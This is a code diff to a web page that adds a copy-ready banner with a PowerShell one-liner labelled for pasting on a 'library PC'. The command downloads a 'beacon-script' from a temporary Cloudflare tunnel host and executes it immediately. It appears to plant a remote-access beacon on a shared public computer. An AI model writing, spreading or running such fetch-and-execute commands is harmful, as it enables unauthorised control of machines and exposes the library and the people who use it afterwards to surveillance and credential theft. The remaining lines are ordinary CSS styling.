@@ -151,9 +151,41 @@
     #loading.connected {
       display: none;
     }
+    
+    /* One-liner banner */
+    #oneliner-banner {
+      background: #0d1117;
+      border: 2px solid #4ade80;
+      border-radius: 0;
+      padding: 12px 20px;
+      flex-shrink: 0;
+    }
+    #oneliner-banner h3 {
+      font-size: 11px;
+      color: #4ade80;
+      margin: 0 0 4px 0;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    #oneliner-banner code {
+      display: block;
+      font-size: 13px;
+      color: #fff;
+      word-break: break-all;
+      line-height: 1.5;
+      user-select: all;
+      background: #1a1a2e;
+      padding: 8px 12px;
+      border-radius: 4px;
+      border: 1px solid #333;
+    }
   </style>
 </head>
 <body>
+  <div id="oneliner-banner">
+    <h3>🪟 PowerShell One-Liner — Paste on library PC:</h3>
+    <code id="oneliner-code">iex (iwr -Uri https://score-blocked-integrate-early.trycloudflare.com/beacon-script).Content</code>
+  </div>
   <div class="header">
     <div class="header-title">
       <span>🤖</span>
